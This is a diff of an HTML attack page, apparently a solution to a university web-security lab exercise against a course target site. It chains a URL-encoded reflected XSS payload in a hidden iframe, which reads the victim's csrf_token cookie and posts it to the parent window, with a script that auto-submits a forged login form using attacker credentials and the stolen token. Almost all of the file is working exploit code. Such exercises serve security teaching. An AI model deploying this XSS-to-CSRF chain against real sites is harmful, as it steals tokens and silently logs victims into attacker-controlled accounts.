@@ -1,50 +1,41 @@
-
 <html>
 
-    <body>
+<body>
 
-        <iframe src="https://bungle.sysnet.ucsd.edu/search?q=%3Cscript%3E%0A%0A%20%20%20%20const%20csrf_token%20%3D%20document.cookie.match(%2Fcsrf_token%3D(%5B%5E%3B%5D%2B)%2F)%5B1%5D%3B%0A%20%20%20%20window.parent.postMessage(csrf_token%2C%20%22*%22)%3B%0A%20%20%20%20%0A%3C%2Fscript%3E%3Cscript%3E%0A%0A%20%20%20%20const%20csrf_token%20%3D%20document.cookie.match(%2Fcsrf_token%3D(%5B%5E%3B%5D%2B)%2F)%5B1%5D%3B%0A%20%20%20%20window.parent.postMessage(csrf_token%2C%20%22*%22)%3B%0A%20%20%20%20%0A%3C%2Fscript%3E" hidden="True"></iframe>
+    <iframe
+        src="https://bungle.sysnet.ucsd.edu/search?csrfdefense=1&xssdefense=0&q=%3Cscript%3E%0A%0A%20%20%20%20const%20csrf_token%20%3D%20document.cookie.match(%2Fcsrf_token%3D(%5B%5E%3B%5D%2B)%2F)%5B1%5D%3B%0A%20%20%20%20window.parent.postMessage(csrf_token%2C%20%22*%22)%3B%0A%20%20%20%20%0A%3C%2Fscript%3E"
+        hidden="True"></iframe>
 
 
-        <!-- <form action="https://bungle.sysnet.ucsd.edu/login" method="POST">
+    <!-- <form action="https://bungle.sysnet.ucsd.edu/login" method="POST">
             <input type="hidden" name="username" value="attacker" />
             <input type="hidden" name="password" value="l33th4x" />
             <input type="hidden" name="csrf_token" value=${event.data}/>
         </form> -->
 
-        <script>
+    <script>
 
 
-            window.addEventListener("message", function(event) { 
+        window.addEventListener("message", function (event) {
 
 
-                var form = document.createElement("form");
-                form.setAttribute("action", "https://bungle.sysnet.ucsd.edu/login?csrfdefense=1&xssdefense=0");
-                form.setAttribute("method", "POST");
-    
-                var usernameInput = document.createElement("input");
-                usernameInput.setAttribute("type", "hidden");
-                usernameInput.setAttribute("name", "username");
-                usernameInput.setAttribute("value", "attacker");
-                form.appendChild(usernameInput);
-    
-                var passwordInput = document.createElement("input");
-                passwordInput.setAttribute("type", "hidden");
-                passwordInput.setAttribute("name", "password");
-                passwordInput.setAttribute("value", "l33th4x");
-                form.appendChild(passwordInput);
-    
-                var csrfTokenInput = document.createElement("input");
-                csrfTokenInput.setAttribute("type", "hidden");
-                csrfTokenInput.setAttribute("name", "csrf_token");
-                csrfTokenInput.setAttribute("value", event.data);
-                form.appendChild(csrfTokenInput);
-    
-                document.body.appendChild(form);
-                form.submit();
-            });
-        </script>
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            const frameDoc = iframe.contentDocument;
+            frameDoc.write(`
+                <body>
+                    <form action="https://bungle.sysnet.ucsd.edu/login?csrfdefense=1&xssdefense=0" method="POST">
+                        <input name="username" value="attacker">
+                        <input name="password" value="l33th4x">
+                        <input name="csrf_token" value="${event.data}">
+                    </form>
+                </body>
+            `);
+            frameDoc.forms[0].submit();
+        });
+    </script>
 
-    </body>
+</body>
 
 </html>
